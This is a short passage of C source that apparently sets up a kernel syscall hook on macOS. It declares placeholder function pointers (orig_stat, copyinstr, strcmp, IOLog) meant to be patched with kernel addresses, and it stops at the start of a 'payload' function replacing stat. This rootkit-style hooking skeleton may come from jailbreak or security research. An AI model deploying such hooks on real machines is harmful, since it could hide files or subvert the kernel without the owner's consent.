...
/* IOLog */ // not working...
const char *LOGDUMP = "[%s]: %s\n";
const char *BLOCKDUMP = "stat";

/* hook */
struct proc;
typedef uint64_t sy_call_t(struct proc *arg1, void *arg2, int *arg3);
typedef int (*orig_stat_t)(struct proc *p, struct stat_args *uap, /* __unused */ uint32_t *retval);
__attribute__((noinline)) orig_stat_t orig_stat = 0x4444444444444444;
...
typedef int (*copyinstr_t)(const user_addr_t uaddr, void *kaddr, size_t len, size_t *done);
__attribute__((noinline)) copyinstr_t copyinstr = 0x4141414141414141;

typedef int (*strcmp_t)(const char *s1, const char *s2);
//__attribute__((noinline)) strcmp_t _strcmp = 0x4242424242424242;
__attribute__((noinline)) strcmp_t _pre_strcmp = 0x4242424242424242;

typedef void (*IOLog_t)(const char *format, ...)
__attribute__((format(printf, 1, 2)));
__attribute__((noinline)) IOLog_t IOLog = 0x4343434343434343;

//__attribute__((noinline)) int _pre_strcmp(const char *a, const char *b){
//    return _strcmp(a, b);
//}

uint64_t payload(struct proc *p, struct stat_args *uap, /* __unused */ uint64_t *retval){
